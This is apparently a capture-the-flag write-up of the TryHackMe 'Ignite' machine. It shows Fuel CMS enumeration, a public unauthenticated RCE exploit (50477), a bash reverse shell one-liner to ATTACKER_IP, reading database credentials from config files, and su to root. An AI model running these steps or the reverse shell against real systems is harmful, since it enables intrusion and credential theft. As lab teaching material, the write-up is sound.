---
title: TryHackme - Ignite CTF
categories: [TryHackMe]
tags: [TryHackme, Printing, ipp, Iot Hacking]
render_with_liquid: false
---

<img width="512" height="512" alt="676cb3273c613c9ba00688162efc0979" src="https://github.com/user-attachments/assets/62d8e75f-ccf6-4a07-9a98-89d285f232b7" />


# – Technical Enumeration & Exploitation

## 1. Host Enumeration (Nmap)

A full TCP scan with service & script detection:

```
nmap -sV -sC -p- -T5 10.65.171.176 -oN nmap.txt
```

Key findings:

```
80/tcp open  http  Apache httpd 2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry
|_/fuel/
```

Observations:

- Only HTTP exposed
    
- CMS fingerprinted via title and robots.txt
    
- Apache 2.4.18 running on Ubuntu → typically old and vulnerable stack
    



## 2. Web Stack Fingerprinting (WhatWeb)

```
whatweb http://10.65.171.176
```

Detected components:

- Fuel CMS
    
- jQuery 1.7.1 (outdated)
    
- Apache/2.4.18 (Ubuntu)
    
- HTML5 with standard template
    

These versions match known Fuel CMS RCE vulnerabilities.



## 3. Vulnerability Identification (SearchSploit)

Search exploits related to Fuel CMS:

```
searchsploit fuel cms
```

<img width="1898" height="259" alt="image" src="https://github.com/user-attachments/assets/5ac6ddfa-8fb7-4346-995e-cc0f4f5d2bd0" />


Available modules include multiple RCE vectors.  
We use exploit **50477** (unauthenticated RCE):

```
searchsploit php/webapps/50477.py -m
```

This copies the exploit locally.



## 4. Remote Code Execution

Execute RCE:

```
python3 50477.py -u http://10.65.171.176/
```

<img width="1073" height="634" alt="image" src="https://github.com/user-attachments/assets/8620a304-6576-4cbe-a7e4-30e617376ac8" />


Exploit behavior:

- Sends a malicious payload to `/fuel/pages/select/`
    
- Triggers template rendering vulnerability
    
- Executes arbitrary PHP commands under `www-data`
    
- Provides a semi‑interactive shell
    

```
id
whoami
```

Output confirms:

```
www-data
```

For better stability, upgrade to a reverse shell:

Example reverse shell payload (bash):

```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```



## 5. Sensitive File Enumeration

Fuel CMS configuration is stored in:

```
/var/www/html/fuel/application/config/
```

Read database configuration:

```
cat /var/www/html/fuel/application/config/database.php
```

The file contains database connection parameters, including:

- DB username
    
- DB password
    
- In many vulnerable Fuel CMS builds, this password matches a system user (including root)
    

Example:

```
$db['default']['username'] = 'root';
$db['default']['password'] = 'PASSWORD_HERE';
```

Credentials obtained allow privilege escalation.



## 6. Privilege Escalation to Root

Use discovered credentials:

```
su root
```

Once authenticated, confirm:

```
id
whoami
```

Retrieve flags:

```
cat /home/www-data/user.txt
cat /root/root.txt
```



## Conclusion

The machine was compromised via:

1. Enumeration → Fuel CMS detected
    
2. Public RCE exploit (50477)
    
3. Extraction of configuration secrets
    
4. Credential reuse → privilege escalation to root
    

Fuel CMS instances below certain versions are vulnerable due to improper template handling and predictable configuration paths.





**7rootsec | Technical CTF Write‑Ups and Research**

